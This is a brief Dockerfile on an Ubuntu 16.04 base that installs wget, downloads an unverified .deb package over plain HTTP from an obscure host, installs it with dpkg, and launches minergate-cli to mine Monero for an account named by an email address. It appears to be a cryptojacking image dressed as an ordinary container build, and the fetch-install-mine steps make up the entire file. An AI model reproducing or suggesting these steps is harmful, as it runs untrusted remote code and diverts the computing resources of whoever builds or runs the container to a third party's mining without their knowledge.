FROM ubuntu:16.04  
USER root  
RUN lscpu  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
ca-certificates \  
wget \  
&& rm -r /var/lib/apt/lists/*  
  
RUN wget -q --content-disposition http://vivivuvu.net//abc.deb \  
&& dpkg -i *.deb \  
&& rm *.deb  
RUN minergate-cli -user greenfieldsvp@outlook.com.vn -xmr  
  

